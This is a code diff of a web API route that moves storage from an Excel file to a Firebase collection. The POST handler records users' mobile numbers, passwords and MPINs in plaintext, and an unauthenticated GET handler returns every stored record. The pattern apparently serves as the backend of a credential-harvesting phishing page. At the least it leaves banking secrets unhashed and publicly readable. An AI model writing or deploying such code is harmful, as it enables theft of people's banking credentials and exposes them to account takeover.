@@ -1,56 +1,30 @@
-import * as XLSX from "xlsx";
-import { writeFileSync, existsSync, readFileSync } from "fs";
+import { db } from "@/lib/firebaseClient";
+import { collection, addDoc, getDocs, query, orderBy } from "firebase/firestore";
 
 export async function POST(req) {
   try {
-    const body = await req.json();
-    const { mobile, password, mpin } = body;
-
-    const filePath = "data.xlsx"; 
-    let data = [];
-
-    if (existsSync(filePath)) {
-      const file = readFileSync(filePath);
-      const workbook = XLSX.read(file, { type: "buffer" });
-      const worksheet = workbook.Sheets[workbook.SheetNames[0]];
-      data = XLSX.utils.sheet_to_json(worksheet);
-    }
-
-    data.push({
+    const { mobile, password, mpin } = await req.json();
+    await addDoc(collection(db, "users"), {
       Mobile: mobile,
       Password: password,
       Mpin: mpin,
-      Date: new Date().toLocaleString(),
+      Date: new Date().toISOString(),
     });
 
-    const worksheet = XLSX.utils.json_to_sheet(data);
-    const workbook = XLSX.utils.book_new();
-    XLSX.utils.book_append_sheet(workbook, worksheet, "Sheet1");
-
-    writeFileSync(filePath, XLSX.write(workbook, { type: "buffer", bookType: "xlsx" }));
-
-    return Response.json({ success: true, message: "Data saved to Excel!" });
+    return new Response(JSON.stringify({ success: true, message: "Data saved to Firebase!" }), { status: 200 });
   } catch (err) {
-    return Response.json({ success: false, error: err.message }, { status: 500 });
+    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
   }
 }
 
-// 🔹 New GET method
 export async function GET() {
   try {
-    const filePath = "data.xlsx";
+    const q = query(collection(db, "users"), orderBy("Date", "desc"));
+    const snapshot = await getDocs(q);
+    const data = snapshot.docs.map(doc => doc.data());
 
-    if (!existsSync(filePath)) {
-      return Response.json({ success: true, data: [] });
-    }
-
-    const file = readFileSync(filePath);
-    const workbook = XLSX.read(file, { type: "buffer" });
-    const worksheet = workbook.Sheets[workbook.SheetNames[0]];
-    const data = XLSX.utils.sheet_to_json(worksheet);
-
-    return Response.json({ success: true, data });
+    return new Response(JSON.stringify({ success: true, data }), { status: 200 });
   } catch (err) {
-    return Response.json({ success: false, error: err.message }, { status: 500 });
+    return new Response(JSON.stringify({ success: false, error: err.message }), { status: 500 });
   }
 }
